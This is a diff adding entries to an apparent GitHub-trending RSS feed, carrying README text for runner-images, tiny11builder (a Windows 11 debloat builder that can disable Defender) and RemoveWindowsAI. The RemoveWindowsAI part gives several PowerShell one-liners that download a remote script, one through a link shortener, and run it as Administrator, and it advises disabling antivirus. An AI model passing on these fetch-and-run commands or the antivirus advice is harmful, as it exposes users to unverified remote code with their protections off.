+   &lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://pypa.github.io/pipx&quot;&gt;pipx&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:right&quot;&gt;ansible-core &lt;br /&gt;yamllint&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Windows&lt;/td&gt; 
+   &lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://chocolatey.org&quot;&gt;Chocolatey&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:right&quot;&gt;No third-party repos installed&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;macOS&lt;/td&gt; 
+   &lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://brew.sh&quot;&gt;Homebrew&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:right&quot;&gt;&lt;a href=&quot;https://github.com/aws/homebrew-tap&quot;&gt;aws-cli v2&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://github.com/Azure/homebrew-bicep&quot;&gt;azure/bicep&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://github.com/mongodb/homebrew-brew&quot;&gt;mongodb/brew&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://pypa.github.io/pipx/&quot;&gt;pipx&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:right&quot;&gt;yamllint&lt;/td&gt; 
+  &lt;/tr&gt; 
+ &lt;/tbody&gt; 
+&lt;/table&gt; 
+&lt;h3&gt;Image Deprecation Policy&lt;/h3&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Images begin the deprecation process of the oldest image label once a new GA OS version has been released.&lt;/li&gt; 
+ &lt;li&gt;Deprecation process begins with an announcement that sets a date for deprecation.&lt;/li&gt; 
+ &lt;li&gt;As it gets closer to the date, GitHub begins doing scheduled brownouts of the image.&lt;/li&gt; 
+ &lt;li&gt;During this time there will be an Announcement pinned in the repo to remind users of the deprecation.&lt;/li&gt; 
+ &lt;li&gt;Finally, GitHub will deprecate the image and it will no longer be available.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h3&gt;Preinstallation Policy&lt;/h3&gt; 
+&lt;p&gt;In general, these are the guidelines we follow when deciding what to pre-install on our images:&lt;/p&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Popularity: widely-used tools and ecosystems will be given priority.&lt;/li&gt; 
+ &lt;li&gt;Latest Technology: recent versions of tools will be given priority.&lt;/li&gt; 
+ &lt;li&gt;Deprecation: end-of-life tools and versions will not be added.&lt;/li&gt; 
+ &lt;li&gt;Licensing: MIT, Apache, or GNU licenses are allowed.&lt;/li&gt; 
+ &lt;li&gt;Time &amp;amp; Space on the Image: we will evaluate how much time is saved and how much space is used by having the tool pre-installed.&lt;/li&gt; 
+ &lt;li&gt;Support: If a tool requires the support of more than one version, we will consider the cost of this maintenance.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h3&gt;Default Version Update Policy&lt;/h3&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;In general, once a new version is installed on the image, we announce the default version update 2 weeks prior to deploying it.&lt;/li&gt; 
+ &lt;li&gt;For potentially dangerous updates, we may extend the timeline up to 1 month between the announcement and deployment.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h2&gt;How to Interact with the Repo&lt;/h2&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;&lt;strong&gt;Issues&lt;/strong&gt;: To file a bug report, or request tools to be added/updated, please&amp;nbsp;&lt;a href=&quot;https://github.com/actions/runner-images/issues/new/choose&quot;&gt;open an issue using the appropriate template&lt;/a&gt;&lt;/li&gt; 
+ &lt;li&gt;&lt;strong&gt;Discussions&lt;/strong&gt;: If you want to share your thoughts about image configuration, installed software, or bring a new idea, please create a &lt;a href=&quot;https://github.com/orgs/community/discussions/new?category=actions&quot;&gt;new discussion&lt;/a&gt;. Before making a new discussion, please make sure no similar topics were created earlier in the &lt;a href=&quot;https://github.com/orgs/community/discussions/categories/actions&quot;&gt;actions category&lt;/a&gt;.&lt;/li&gt; 
+ &lt;li&gt;For general questions about using the runner images or writing your Actions workflow, please open requests in the &lt;a href=&quot;https://github.com/orgs/community/discussions/categories/actions&quot;&gt;GitHub Community discussion Actions category&lt;/a&gt;.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h2&gt;FAQs&lt;/h2&gt; 
+&lt;details&gt; 
+ &lt;summary&gt;&lt;b&gt;&lt;i&gt;What images are available for GitHub Actions and Azure DevOps?&lt;/i&gt;&lt;/b&gt;&lt;/summary&gt; 
+ &lt;p&gt;The availability of images for GitHub Actions and Azure DevOps is the same. However, deprecation policies may differ. See documentation for more details:&lt;/p&gt; 
+ &lt;ul&gt; 
+  &lt;li&gt;&lt;a href=&quot;https://docs.github.com/en/free-pro-team@latest/actions/reference/specifications-for-github-hosted-runners#supported-runners-and-hardware-resources&quot;&gt;GitHub Actions&lt;/a&gt;&lt;/li&gt; 
+  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/azure/devops/pipelines/agents/hosted?view=azure-devops&amp;amp;tabs=yaml#software&quot;&gt;Azure DevOps&lt;/a&gt;&lt;/li&gt; 
+ &lt;/ul&gt; 
+&lt;/details&gt; 
+&lt;details&gt; 
+ &lt;summary&gt;&lt;b&gt;&lt;i&gt;What image version is used in my build?&lt;/i&gt;&lt;/b&gt;&lt;/summary&gt; 
+ &lt;p&gt;Usually, image deployment takes 2-3 days, and documentation in the &lt;code&gt;main&lt;/code&gt; branch is only updated when deployment is finished. To find out which image version and what software versions are used in a specific build, see &lt;code&gt;Set up job&lt;/code&gt; (GitHub Actions) or &lt;code&gt;Initialize job&lt;/code&gt; (Azure DevOps) step log. &lt;img width=&quot;1440&quot; alt=&quot;actions-runner-image&quot; src=&quot;https://github.com/actions/runner-images/assets/88318005/922a8bf5-3e4d-4265-9527-b3b51e6bf9c8&quot; /&gt;&lt;/p&gt; 
+&lt;/details&gt; 
+&lt;details&gt; 
+ &lt;summary&gt;&lt;b&gt;&lt;i&gt;Looking for other Linux distributions?&lt;/i&gt;&lt;/b&gt;&lt;/summary&gt; 
+ &lt;p&gt;We do not plan to offer other Linux distributions. We recommend using Docker if you&#39;d like to build using other distributions with the hosted runner images. Alternatively, you can leverage &lt;a href=&quot;https://help.github.com/en/actions/hosting-your-own-runners&quot;&gt;self-hosted runners&lt;/a&gt; and fully customize your VM image to your needs.&lt;/p&gt; 
+&lt;/details&gt; 
+&lt;details&gt; 
+ &lt;summary&gt;&lt;b&gt;&lt;i&gt;How do I contribute to the macOS source?&lt;/i&gt;&lt;/b&gt;&lt;/summary&gt; 
+ &lt;p&gt;macOS source lives in this repository and is available for everyone. However, macOS image-generation CI doesn&#39;t support external contributions yet so we are not able to accept pull-requests for now.&lt;/p&gt; 
+ &lt;p&gt;We are in the process of preparing macOS CI to accept contributions. Until then, we appreciate your patience and ask you to continue to make tool requests by filing issues.&lt;/p&gt; 
+&lt;/details&gt; 
+&lt;details&gt; 
+ &lt;summary&gt;&lt;b&gt;&lt;i&gt;How does GitHub determine what tools are installed on the images?&lt;/i&gt;&lt;/b&gt;&lt;/summary&gt; 
+ &lt;p&gt;For some tools, we always install the latest at the time of the deployment; for others, we pin the tool to specific version(s). For more details please see the &lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/#preinstallation-policy&quot;&gt;Preinstallation Policy&lt;/a&gt;&lt;/p&gt; 
+&lt;/details&gt; 
+&lt;details&gt; 
+ &lt;summary&gt;&lt;b&gt;&lt;i&gt;How do I request that a new tool be pre-installed on the image?&lt;/i&gt;&lt;/b&gt;&lt;/summary&gt; Please create an issue and get an approval from us to add this tool to the image before creating the pull request. 
+&lt;/details&gt; 
+&lt;details&gt; 
+ &lt;summary&gt;&lt;b&gt;&lt;i&gt;What branch should I use to build custom image?&lt;/i&gt;&lt;/b&gt;&lt;/summary&gt; We strongly encourage customers to build their own images using the main branch. This repository contains multiple branches and releases that serve as document milestones to reflect what software is installed in the images at certain point of time. Current builds are not idempotent and if one tries to build a runner image using the specific tag it is not guaranteed that the build will succeed. 
+&lt;/details&gt;</description>
+      
+      <media:content url="https://opengraph.githubassets.com/62d1f05136ec49cdb5f1347cf804e8f17f936714ceb13d2ab75028193bf1691e/actions/runner-images" medium="image" />
+      
+    </item>
+    
+    <item>
+      <title>ntdevlabs/tiny11builder</title>
+      <link>https://github.com/ntdevlabs/tiny11builder</link>
+      <description>&lt;p&gt;Scripts to build a trimmed-down Windows 11 image.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;tiny11builder&lt;/h1&gt; 
+&lt;p&gt;&lt;em&gt;Scripts to build a trimmed-down Windows 11 image - now in &lt;strong&gt;PowerShell&lt;/strong&gt;!&lt;/em&gt;&lt;/p&gt; 
+&lt;h2&gt;Introduction :&lt;/h2&gt; 
+&lt;p&gt;Tiny11 builder, now completely overhauled. &lt;br /&gt; After more than a year (for which I am so sorry) of no updates, tiny11 builder is now a much more complete and flexible solution - one script fits all. Also, it is a steppingstone for an even more fleshed-out solution.&lt;/p&gt; 
+&lt;p&gt;You can now use it on ANY Windows 11 release (not just a specific build), as well as ANY language or architecture. This is made possible thanks to the much-improved scripting capabilities of PowerShell, compared to the older Batch release.&lt;/p&gt; 
+&lt;p&gt;This is a script created to automate the build of a streamlined Windows 11 image, similar to tiny10. The script has also been updated to use DISM&#39;s recovery compression, resulting in a much smaller final ISO size, and no utilities from external sources. The only other executable included is &lt;strong&gt;oscdimg.exe&lt;/strong&gt;, which is provided in the Windows ADK and it is used to create bootable ISO images. Also included is an unattended answer file, which is used to bypass the Microsoft Account on OOBE and to deploy the image with the &lt;code&gt;/compact&lt;/code&gt; flag. It&#39;s open-source, &lt;strong&gt;so feel free to add or remove anything you want!&lt;/strong&gt; Feedback is also much appreciated.&lt;/p&gt; 
+&lt;p&gt;Also, for the very first time, &lt;strong&gt;introducing tiny11 core builder&lt;/strong&gt;! A more powerful script, designed for a quick and dirty development testbed. Just the bare minimum, none of the fluff. This script generates a significantly reduced Windows 11 image. However, &lt;strong&gt;it&#39;s not suitable for regular use due to its lack of serviceability - you can&#39;t add languages, updates, or features post-creation&lt;/strong&gt;. tiny11 Core is not a full Windows 11 substitute but a rapid testing or development tool, potentially useful for VM environments.&lt;/p&gt; 
+&lt;hr /&gt; 
+&lt;h2&gt;⚠️ Script versions:&lt;/h2&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;&lt;strong&gt;tiny11maker.ps1&lt;/strong&gt; : The regular script, which removes a lot of bloat but keeps the system serviceable. You can add languages, updates, and features post-creation. This is the recommended script for regular use.&lt;/li&gt; 
+ &lt;li&gt;⚠️ &lt;strong&gt;tiny11coremaker.ps1&lt;/strong&gt; : The core script, which removes even more bloat but also removes the ability to service the image. You cannot add languages, updates, or features post-creation. This is recommended for quick testing or development use.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h2&gt;Instructions:&lt;/h2&gt; 
+&lt;ol&gt; 
+ &lt;li&gt;Download Windows 11 from the &lt;a href=&quot;https://www.microsoft.com/software-download/windows11&quot;&gt;Microsoft website&lt;/a&gt; or &lt;a href=&quot;https://github.com/pbatard/rufus&quot;&gt;Rufus&lt;/a&gt;&lt;/li&gt; 
+ &lt;li&gt;Mount the downloaded ISO image using Windows Explorer.&lt;/li&gt; 
+ &lt;li&gt;Open &lt;strong&gt;PowerShell 5.1&lt;/strong&gt; as Administrator.&lt;/li&gt; 
+ &lt;li&gt;Change the script execution policy :&lt;/li&gt; 
+&lt;/ol&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;Set-ExecutionPolicy Bypass -Scope Process
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;blockquote&gt; 
+ &lt;p&gt;Using &lt;code&gt;-Scope Process&lt;/code&gt; you keep your original policy intact as this change only lasts for the current PowerShell session.&lt;/p&gt; 
+&lt;/blockquote&gt; 
+&lt;ol start=&quot;6&quot;&gt; 
+ &lt;li&gt;Start the script :&lt;/li&gt; 
+&lt;/ol&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;C:/path/to/your/tiny11/script.ps1 -ISO &amp;lt;letter&amp;gt; -SCRATCH &amp;lt;letter&amp;gt;
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;blockquote&gt; 
+ &lt;p&gt;You can see of the script by running the &lt;code&gt;get-help&lt;/code&gt; command.&lt;/p&gt; 
+&lt;/blockquote&gt; 
+&lt;ol start=&quot;6&quot;&gt; 
+ &lt;li&gt;Select the drive letter where the image is mounted (only the letter, no colon (😃)&lt;/li&gt; 
+ &lt;li&gt;Select the SKU that you want the image to be based.&lt;/li&gt; 
+ &lt;li&gt;Sit back and relax 😃&lt;/li&gt; 
+ &lt;li&gt;When the image is completed, you will see it in the folder where the script was extracted, with the name tiny11.iso&lt;/li&gt; 
+&lt;/ol&gt; 
+&lt;hr /&gt; 
+&lt;h2&gt;What is removed:&lt;/h2&gt; 
+&lt;table&gt; 
+ &lt;tbody&gt; 
+  &lt;tr&gt; 
+   &lt;th&gt;Tiny11maker&lt;/th&gt; 
+   &lt;th&gt;Tiny11coremaker&lt;/th&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt; 
+    &lt;ul&gt; 
+     &lt;li&gt;Clipchamp&lt;/li&gt; 
+     &lt;li&gt;News&lt;/li&gt; 
+     &lt;li&gt;Weather&lt;/li&gt; 
+     &lt;li&gt;Xbox&lt;/li&gt; 
+     &lt;li&gt;GetHelp&lt;/li&gt; 
+     &lt;li&gt;GetStarted&lt;/li&gt; 
+     &lt;li&gt;Office Hub&lt;/li&gt; 
+     &lt;li&gt;Solitaire&lt;/li&gt; 
+     &lt;li&gt;PeopleApp&lt;/li&gt; 
+     &lt;li&gt;PowerAutomate&lt;/li&gt; 
+     &lt;li&gt;ToDo&lt;/li&gt; 
+     &lt;li&gt;Alarms&lt;/li&gt; 
+     &lt;li&gt;Mail and Calendar&lt;/li&gt; 
+     &lt;li&gt;Feedback Hub&lt;/li&gt; 
+     &lt;li&gt;Maps&lt;/li&gt; 
+     &lt;li&gt;Sound Recorder&lt;/li&gt; 
+     &lt;li&gt;Your Phone&lt;/li&gt; 
+     &lt;li&gt;Media Player&lt;/li&gt; 
+     &lt;li&gt;QuickAssist&lt;/li&gt; 
+     &lt;li&gt;Internet Explorer&lt;/li&gt; 
+     &lt;li&gt;Tablet PC Math&lt;/li&gt; 
+     &lt;li&gt;Edge&lt;/li&gt; 
+     &lt;li&gt;OneDrive&lt;/li&gt; 
+    &lt;/ul&gt; &lt;/td&gt; 
+   &lt;td&gt; 
+    &lt;ul&gt; 
+     &lt;li&gt;all from regular tiny +&lt;/li&gt; 
+     &lt;li&gt;Windows Component Store (WinSxS)&lt;/li&gt; 
+     &lt;li&gt;Windows Defender (only disabled, can be enabled back if needed)&lt;/li&gt; 
+     &lt;li&gt;Windows Update (wouldn&#39;t work without WinSxS, enabling it would put the system in a state of failure)&lt;/li&gt; 
+     &lt;li&gt;WinRE&lt;/li&gt; 
+    &lt;/ul&gt; &lt;/td&gt; 
+  &lt;/tr&gt; 
+ &lt;/tbody&gt; 
+&lt;/table&gt; 
+&lt;p&gt;Keep in mind that &lt;strong&gt;you cannot add back features in tiny11 core&lt;/strong&gt;! &lt;br /&gt; You will be asked during image creation if you want to enable .net 3.5 support!&lt;/p&gt; 
+&lt;hr /&gt; 
+&lt;h2&gt;Known issues:&lt;/h2&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Although Edge is removed, there are some remnants in the Settings, but the app in itself is deleted.&lt;/li&gt; 
+ &lt;li&gt;You might have to update Winget before being able to install any apps, using Microsoft Store.&lt;/li&gt; 
+ &lt;li&gt;Outlook and Dev Home might reappear after some time. This is an ongoing battle, though the latest script update tries to prevent this more aggressively.&lt;/li&gt; 
+ &lt;li&gt;If you are using this script on arm64, you might see a glimpse of an error while running the script. This is caused by the fact that the arm64 image doesn&#39;t have OneDriveSetup.exe included in the System32 folder.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;hr /&gt; 
+&lt;h2&gt;Features to be implemented:&lt;/h2&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;&lt;s&gt;disabling telemetry&lt;/s&gt; (Implemented in the 04-29-24 release!)&lt;/li&gt; 
+ &lt;li&gt;&lt;s&gt;more ad suppression&lt;/s&gt; (Partially implemented in the 09-06-25 release!)&lt;/li&gt; 
+ &lt;li&gt;improved language and arch detection&lt;/li&gt; 
+ &lt;li&gt;more flexibility in what to keep and what to delete&lt;/li&gt; 
+ &lt;li&gt;maybe a GUI???&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;p&gt;And that&#39;s pretty much it for now!&lt;/p&gt; 
+&lt;h2&gt;❤️ Support the Project&lt;/h2&gt; 
+&lt;p&gt;If this project has helped you, please consider showing your support! A small donation helps me dedicate more time to projects like this. Thank you!&lt;/p&gt; 
+&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;http://patreon.com/ntdev&quot;&gt;Patreon&lt;/a&gt; | &lt;a href=&quot;http://paypal.me/ntdev2&quot;&gt;PayPal&lt;/a&gt; | &lt;a href=&quot;http://ko-fi.com/ntdev&quot;&gt;Ko-fi&lt;/a&gt;&lt;/strong&gt; Thanks for trying it and let me know how you like it!&lt;/p&gt;</description>
+      
+      <media:content url="https://opengraph.githubassets.com/72f63e98cbc5b556ed9c8d223f5b2032bbac5f17bc90cd335314c47bee464aa3/ntdevlabs/tiny11builder" medium="image" />
+      
+    </item>
+    
+    <item>
+      <title>zoicware/RemoveWindowsAI</title>
+      <link>https://github.com/zoicware/RemoveWindowsAI</link>
+      <description>&lt;p&gt;Force Remove Copilot, Recall and More in Windows 11&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Remove Windows Ai&lt;/h1&gt; 
+&lt;h2&gt;Why?&lt;/h2&gt; 
+&lt;p&gt;The current 25H2 build of Windows 11 and future builds will include increasingly more AI features and components. This script aims to remove ALL of these features to improve user experience, privacy and security.&lt;/p&gt; 
+&lt;img width=&quot;150&quot; alt=&quot;AI-Explorer-icon&quot; src=&quot;https://github.com/zoicware/RemoveWindowsAI/assets/118035521/33efb033-c935-416c-977d-777bb69a3737&quot; /&gt; 
+&lt;hr /&gt; 
+&lt;h3&gt;Script Features&lt;/h3&gt; 
+&lt;ul&gt; 
+ &lt;li&gt; &lt;p&gt;&lt;strong&gt;Disable Registry Keys&lt;/strong&gt;&lt;/p&gt; 
+  &lt;ul&gt; 
+   &lt;li&gt;Disable Copilot&lt;/li&gt; 
+   &lt;li&gt;Disable Recall&lt;/li&gt; 
+   &lt;li&gt;Disable Input Insights and typing data harvesting&lt;/li&gt; 
+   &lt;li&gt;Copilot in Edge&lt;/li&gt; 
+   &lt;li&gt;Disable AI Experiments Program in Paint&lt;/li&gt; 
+   &lt;li&gt;Remove AI Fabric Service&lt;/li&gt; 
+   &lt;li&gt;Disable AI Actions&lt;/li&gt; 
+   &lt;li&gt;Disable Voice Access&lt;/li&gt; 
+   &lt;li&gt;Disable AI Voice Effects&lt;/li&gt; 
+   &lt;li&gt;Disable AI in Settings Search&lt;/li&gt; 
+   &lt;li&gt;Disable Gaming Copilot&lt;/li&gt; 
+   &lt;li&gt;Disable Copilot in All Office Apps&lt;/li&gt; 
+   &lt;li&gt;Disable AI Features in Photos App&lt;/li&gt; 
+   &lt;li&gt;Disable Click to Do in Snipping Tool&lt;/li&gt; 
+  &lt;/ul&gt; &lt;/li&gt; 
+ &lt;li&gt; &lt;p&gt;&lt;strong&gt;Prevent Reinstall of AI Packages&lt;/strong&gt;&lt;/p&gt; 
+  &lt;ul&gt; 
+   &lt;li&gt;Installs custom Windows Update package to prevent reinstall of AI packages in the CBS (Component-Based Servicing) store&lt;/li&gt; 
+  &lt;/ul&gt; &lt;/li&gt; 
+ &lt;li&gt; &lt;p&gt;&lt;strong&gt;Disable Copilot policies&lt;/strong&gt;&lt;/p&gt; 
+  &lt;ul&gt; 
+   &lt;li&gt;Disables policies related to Copilot and Recall in IntegratedServicesRegionPolicySet.json&lt;/li&gt; 
+  &lt;/ul&gt; &lt;/li&gt; 
+ &lt;li&gt; &lt;p&gt;&lt;strong&gt;Remove AI Appx Packages&lt;/strong&gt;&lt;/p&gt; 
+  &lt;ul&gt; 
+   &lt;li&gt;Removes all AI appx packages including &lt;code&gt;Nonremovable&lt;/code&gt; packages and WindowsWorkload&lt;/li&gt; 
+  &lt;/ul&gt; &lt;/li&gt; 
+ &lt;li&gt; &lt;p&gt;&lt;strong&gt;Remove Recall Optional Feature&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
+ &lt;li&gt; &lt;p&gt;&lt;strong&gt;Remove AI Packages in CBS&lt;/strong&gt;&lt;/p&gt; 
+  &lt;ul&gt; 
+   &lt;li&gt;This will remove hidden and locked AI packages in the CBS (Component-Based Servicing) store&lt;/li&gt; 
+  &lt;/ul&gt; &lt;/li&gt; 
+ &lt;li&gt; &lt;p&gt;&lt;strong&gt;Remove AI Files&lt;/strong&gt;&lt;/p&gt; 
+  &lt;ul&gt; 
+   &lt;li&gt;This will do a full system cleanup removing all remaining AI installers, registry keys, and package files&lt;/li&gt; 
+  &lt;/ul&gt; &lt;/li&gt; 
+ &lt;li&gt; &lt;p&gt;&lt;strong&gt;Hide AI Components&lt;/strong&gt;&lt;/p&gt; 
+  &lt;ul&gt; 
+   &lt;li&gt;This will hide the settings page &lt;code&gt;AI Components&lt;/code&gt;&lt;/li&gt; 
+  &lt;/ul&gt; &lt;/li&gt; 
+ &lt;li&gt; &lt;p&gt;&lt;strong&gt;Disable Rewrite AI Feature in Notepad&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
+ &lt;li&gt; &lt;p&gt;&lt;strong&gt;Remove Windows AI Tasks&lt;/strong&gt;&lt;/p&gt; 
+  &lt;ul&gt; 
+   &lt;li&gt;Forcibly removes all instances of Windows AI scheduled tasks&lt;/li&gt; 
+  &lt;/ul&gt; &lt;/li&gt; 
+ &lt;li&gt; &lt;p&gt;&lt;strong&gt;Update Cleanup Check&lt;/strong&gt;&lt;/p&gt; 
+  &lt;ul&gt; 
+   &lt;li&gt;Creates scheduled task to check if Windows has been updated and if it has, newly installed AI features will be removed&lt;/li&gt; 
+  &lt;/ul&gt; &lt;/li&gt; 
+ &lt;li&gt; &lt;h4&gt;Install Classic Apps&lt;/h4&gt; 
+  &lt;ul&gt; 
+   &lt;li&gt;These options will allow you to replace the modern AI infested apps with their classic version&lt;/li&gt; 
+   &lt;li&gt;&lt;strong&gt;Options:&lt;/strong&gt; Replace Notepad, Paint, Snipping Tool, Photo Viewer, and Install Photos Legacy&lt;/li&gt; 
+  &lt;/ul&gt; &lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h4&gt;Manual AI Disabling&lt;/h4&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Unfortunately, not all features and settings can be disabled via a script. This guide will show additional AI features to disable.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;blockquote&gt; 
+ &lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/zoicware/RemoveWindowsAI/raw/main/OtherAIFeatures.md&quot;&gt;Disable Other AI Features&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; 
+&lt;/blockquote&gt; 
+&lt;h3&gt;Read the Script Docs Here&lt;/h3&gt; 
+&lt;blockquote&gt; 
+ &lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/zoicware/RemoveWindowsAI/raw/main/Documentation.md&quot;&gt;Documentation&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; 
+&lt;/blockquote&gt; 
+&lt;div class=&quot;markdown-alert markdown-alert-warning&quot;&gt;
+ &lt;p class=&quot;markdown-alert-title&quot;&gt;
+  &lt;svg class=&quot;octicon octicon-alert mr-2&quot; viewbox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; height=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;
+   &lt;path d=&quot;M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z&quot;&gt;&lt;/path&gt;
+  &lt;/svg&gt;Warning&lt;/p&gt;
+ &lt;p&gt;Some third party anti-viruses will falsely detect the script as malicious, obviously this is a false positive and the anti-virus will need to be temporarily disabled or set the script as an exclusion.&lt;/p&gt; 
+ &lt;p&gt;Due to the nature of making advanced changes to the system many debloat tools/scripts will be falsely detected as malware... if you are unsure about the script I always recommend testing any software in a virtual machine first&lt;/p&gt; 
+&lt;/div&gt; 
+&lt;hr /&gt; 
+&lt;h3&gt;How to Use&lt;/h3&gt; 
+&lt;h4&gt;Run From Powershell Console as Administrator&lt;/h4&gt; 
+&lt;hr /&gt; 
+&lt;div class=&quot;markdown-alert markdown-alert-warning&quot;&gt;
+ &lt;p class=&quot;markdown-alert-title&quot;&gt;
+  &lt;svg class=&quot;octicon octicon-alert mr-2&quot; viewbox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; height=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;
+   &lt;path d=&quot;M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z&quot;&gt;&lt;/path&gt;
+  &lt;/svg&gt;Warning&lt;/p&gt;
+ &lt;p&gt;Running the script with PowerShell 7 is no longer supported and it WILL cause issues, to avoid this ensure you are running Windows PowerShell (5.1)&lt;/p&gt; 
+&lt;/div&gt; 
+&lt;h3&gt;Launch with UI&lt;/h3&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-PowerShell&quot;&gt;&amp;amp; ([scriptblock]::Create((irm &quot;https://raw.githubusercontent.com/zoicware/RemoveWindowsAI/main/RemoveWindowsAi.ps1&quot;)))
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;h3&gt;Compact Command:&lt;/h3&gt; 
+&lt;h5&gt;Link shortened using open source link shortener: &lt;a href=&quot;https://kutt.to/&quot;&gt;https://kutt.to/&lt;/a&gt;&lt;/h5&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-PowerShell&quot;&gt;&amp;amp; ([scriptblock]::Create((irm &#39;https://kutt.to/RWAI&#39;)))
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;details&gt; 
+ &lt;summary&gt;Click to View UI&lt;/summary&gt; 
+ &lt;img width=&quot;586&quot; height=&quot;693&quot; alt=&quot;Capture2&quot; src=&quot;https://github.com/user-attachments/assets/a2a4f371-23fa-4549-9b4d-25e91a5aa71e&quot; /&gt; 
+ &lt;img width=&quot;556&quot; height=&quot;253&quot; alt=&quot;Capture2&quot; src=&quot;https://github.com/user-attachments/assets/8a446a23-7c47-468e-856b-1e783205c511&quot; /&gt; 
+&lt;/details&gt; 
+&lt;p&gt;&amp;nbsp;&lt;/p&gt; 
+&lt;h3&gt;Command Line Options&lt;/h3&gt; 
+&lt;p&gt;&lt;strong&gt;Run in Non-Interactive Mode with All Options&lt;/strong&gt;&lt;/p&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-PowerShell&quot;&gt;&amp;amp; ([scriptblock]::Create((irm &quot;https://raw.githubusercontent.com/zoicware/RemoveWindowsAI/main/RemoveWindowsAi.ps1&quot;))) -nonInteractive -AllOptions
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;hr /&gt; 
+&lt;p&gt;&lt;strong&gt;Run with Specific Options Example&lt;/strong&gt;&lt;/p&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-PowerShell&quot;&gt;&amp;amp; ([scriptblock]::Create((irm &quot;https://raw.githubusercontent.com/zoicware/RemoveWindowsAI/main/RemoveWindowsAi.ps1&quot;))) -nonInteractive -Options DisableRegKeys,RemoveAppxPackages,DisableCopilotPolicies 
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;p&gt;&lt;strong&gt;Run with Specific Options Excluded Example&lt;/strong&gt;&lt;/p&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-PowerShell&quot;&gt;&amp;amp; ([scriptblock]::Create((irm &quot;https://raw.githubusercontent.com/zoicware/RemoveWindowsAI/main/RemoveWindowsAi.ps1&quot;))) -nonInteractive -ExcludeOptions -Options DisableRegKeys,RemoveAppxPackages,DisableCopilotPolicies 
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;p&gt;&lt;strong&gt;All Possible Options:&lt;/strong&gt;&lt;/p&gt; 
+&lt;pre&gt;&lt;code&gt;DisableRegKeys          
+PreventAIPackageReinstall     
+DisableCopilotPolicies       
+RemoveAppxPackages        
+RemoveRecallFeature 
